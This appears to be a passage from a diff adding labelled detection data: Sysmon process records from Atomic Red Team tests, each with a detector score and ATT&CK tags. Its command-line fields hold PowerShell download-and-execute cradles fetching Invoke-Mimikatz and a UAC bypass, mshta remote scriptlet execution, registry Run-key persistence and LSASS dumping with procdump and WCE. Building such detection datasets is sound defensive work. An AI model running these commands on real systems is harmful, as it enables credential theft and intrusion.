+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.723,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3B-603E-FEAA-00000000AD01}",
+   "parent": "{05ADC7E1-6E3B-603E-FDAA-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.393,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3C-603E-FFAA-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.743,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetex",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3C-603E-00AB-00000000AD01}",
+   "parent": "{05ADC7E1-6E3C-603E-FFAA-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.633,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetext\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3D-603E-01AB-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.85,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3D-603E-02AB-00000000AD01}",
+   "parent": "{05ADC7E1-6E3D-603E-01AB-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.57,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\"  -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | iex\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3D-603E-03AB-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.963,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3D-603E-04AB-00000000AD01}",
+   "parent": "{05ADC7E1-6E3D-603E-03AB-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "c:\\windows\\system32\\cmd.exe  /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{05ADC7E1-6E3E-603E-05AB-00000000AD01}",
+   "parent": "{05ADC7E1-6E3D-603E-04AB-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.823,
+   "tier": "HIGH",
+   "exe": "mshta.exe",
+   "count": 1,
+   "cmd": "mshta.exe  javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close() ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [
+    "dns -> raw.githubusercontent.com",
+    "network -> 185.199.109.133:443"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9B3-6040-434E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.713,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9B3-6040-444E-00000000AD01}",
+   "parent": "{5ABCFE62-E9B3-6040-434E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.55,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    },
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9BF-6040-484E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.49,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {$url='https://raw.githubusercontent.com/powershellmafia/powersploit/f650520c4b1004daf8b3ec08007a0b945b91253a/exfiltration/invoke-mimikatz.ps1';$wshell=new-object -comobject wscript.shell;$reg='hkcu:\\software\\microsoft\\notepad';$app='note",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C0-6040-494E-00000000AD01}",
+   "parent": "{5ABCFE62-E9BF-6040-484E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.967,
+   "tier": "HIGH",
+   "exe": "notepad.exe",
+   "count": 1,
+   "cmd": "notepad",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C2-6040-4A4E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.723,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C2-6040-4B4E-00000000AD01}",
+   "parent": "{5ABCFE62-E9C2-6040-4A4E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.393,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  \"iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/enigma0x3/misc-powershell-stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/invoke-apppathbypass.ps1'); invoke-apppathbypass -payload 'c:\\windows\\system32\\cmd.exe'\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1105",
+     "name": "Ingress tool transfer",
+     "tactic": "Command and Control"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C2-6040-4D4E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.743,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"powershell.exe -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetex",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C2-6040-4E4E-00000000AD01}",
+   "parent": "{5ABCFE62-E9C2-6040-4D4E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.633,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "powershell.exe  -exec bypass -noprofile \"$commsxml=new-object -comobject msxml2.serverxmlhttp;$commsxml.open('get','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.ps1',$false);$commsxml.send();iex $commsxml.responsetext\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C3-6040-504E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.85,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C3-6040-514E-00000000AD01}",
+   "parent": "{5ABCFE62-E9C3-6040-504E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.57,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\"  -exec bypass -noprofile \"$xml = (new-object system.xml.xmldocument);$xml.load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/test.xml');$xml.command.a.execute | iex\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C3-6040-534E-00000000AD01}",
+   "parent": "",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.963,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\"\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C3-6040-544E-00000000AD01}",
+   "parent": "{5ABCFE62-E9C3-6040-534E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "c:\\windows\\system32\\cmd.exe  /c \"mshta.exe javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close()\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{5ABCFE62-E9C3-6040-554E-00000000AD01}",
+   "parent": "{5ABCFE62-E9C3-6040-544E-00000000AD01}",
+   "stage": 2,
+   "source": "T1059.001__atomic_red_team__windows-sysmon",
+   "prob": 0.823,
+   "tier": "HIGH",
+   "exe": "mshta.exe",
+   "count": 1,
+   "cmd": "mshta.exe  javascript:a=getobject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1059.001/src/mshta.sct').exec();close() ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1218.005",
+     "name": "Mshta proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [
+    "dns -> raw.githubusercontent.com",
+    "network -> 185.199.109.133:443"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD2E-5FC0-E800-000000009101}",
+   "parent": "",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.777,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"reg add \"hkcu\\software\\microsoft\\windows\\currentversion\\run\" /v \"atomic red team\" /t reg_sz /f /d \"c:\\path\\atomicredteam.exe\"\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1547.001",
+     "name": "Registry run key",
+     "tactic": "Persistence"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD2E-5FC0-E900-000000009101}",
+   "parent": "{3368E97D-BD2E-5FC0-E800-000000009101}",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.827,
+   "tier": "HIGH",
+   "exe": "reg.exe",
+   "count": 1,
+   "cmd": "reg  add \"hkcu\\software\\microsoft\\windows\\currentversion\\run\" /v \"atomic red team\" /t reg_sz /f /d \"c:\\path\\atomicredteam.exe\" ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1547.001",
+     "name": "Registry run key",
+     "tactic": "Persistence"
+    }
+   ],
+   "actions": [
+    "registry set -> hku\\s-1-5-21-3050610357-2573237788-2544563163-500\\software\\microsoft\\w"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD2E-5FC0-EB00-000000009101}",
+   "parent": "",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.847,
+   "tier": "HIGH",
+   "exe": "reg.exe",
+   "count": 1,
+   "cmd": "reg  add hklm\\software\\microsoft\\windows\\currentversion\\runonceex\\0001\\depend /v 1 /d \"c:\\path\\atomicredteam.dll\" ",
+   "launched_via": [
+    "cmd.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1547.001",
+     "name": "Registry run key",
+     "tactic": "Persistence"
+    }
+   ],
+   "actions": [
+    "registry set -> hklm\\software\\microsoft\\windows\\currentversion\\runonceex\\0001\\depend\\1"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD32-5FC0-0501-000000009101}",
+   "parent": "",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.987,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"reg delete \"hkcu\\software\\microsoft\\windows\\currentversion\\run\" /v \"atomic red team\" /f >nul 2>&1\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD32-5FC0-0601-000000009101}",
+   "parent": "{3368E97D-BD32-5FC0-0501-000000009101}",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "reg.exe",
+   "count": 1,
+   "cmd": "reg  delete \"hkcu\\software\\microsoft\\windows\\currentversion\\run\" /v \"atomic red team\" /f  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD32-5FC0-0701-000000009101}",
+   "parent": "",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.977,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"reg delete hklm\\software\\microsoft\\windows\\currentversion\\runonceex\\0001\\depend /v 1 /f >nul 2>&1\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3368E97D-BD32-5FC0-0801-000000009101}",
+   "parent": "{3368E97D-BD32-5FC0-0701-000000009101}",
+   "stage": 3,
+   "source": "T1547.001__atomic_red_team__windows-sysmon",
+   "prob": 0.967,
+   "tier": "HIGH",
+   "exe": "reg.exe",
+   "count": 1,
+   "cmd": "reg  delete hklm\\software\\microsoft\\windows\\currentversion\\runonceex\\0001\\depend /v 1 /f  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD5-5FA1-E000-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.473,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {cmd /c \\\"\"if not exist %%tmp%%\\lsass.dmp (exit /b 1)\\\"\"} ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD5-5FA1-E100-000000008801}",
+   "parent": "{D28789B6-7CD5-5FA1-E000-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.737,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"if not exist %%tmp%%\\lsass.dmp (exit /b 1)\"",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD6-5FA1-E400-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.41,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {if (cmd /c pypykatz -h) {exit 0} else {exit 1}} ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD6-5FA1-E500-000000008801}",
+   "parent": "{D28789B6-7CD6-5FA1-E400-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.913,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c pypykatz -h",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD6-5FA1-E700-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.41,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {if (cmd /c pypykatz -h) {exit 0} else {exit 1}} ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CD7-5FA1-E800-000000008801}",
+   "parent": "{D28789B6-7CD6-5FA1-E700-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.913,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c pypykatz -h",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDA-5FA1-0A01-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\atomicredteam\\atomics\\t1003.001\\bin\\wce.exe -o %%temp%%\\wce-output.txt\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDA-5FA1-0B01-000000008801}",
+   "parent": "{D28789B6-7CDA-5FA1-0A01-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.99,
+   "tier": "HIGH",
+   "exe": "wce.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\wce.exe  -o c:\\users\\admini~1\\appdata\\local\\temp\\wce-output.txt ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\users\\admini~1\\appdata\\local\\temp\\644c305e-30f4-470b-b616-d924c3206"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDB-5FA1-1801-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.947,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDB-5FA1-1A01-000000008801}",
+   "parent": "{D28789B6-7CDB-5FA1-1801-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.917,
+   "tier": "HIGH",
+   "exe": "procdump.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe  -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump64.exe",
+    "registry set -> hku\\s-1-5-21-635769498-3620204953-2298246598-500\\software\\sysinternals"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDB-5FA1-1D01-000000008801}",
+   "parent": "{D28789B6-7CDB-5FA1-1A01-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.313,
+   "tier": "REVIEW",
+   "exe": "procdump64.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe  -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp ",
+   "launched_via": [
+    "procdump.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\windows\\temp\\lsass_dump.dmp",
+    "registry set -> hku\\s-1-5-21-635769498-3620204953-2298246598-500\\software\\sysinternals"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDE-5FA1-2101-000000008801}",
+   "parent": "",
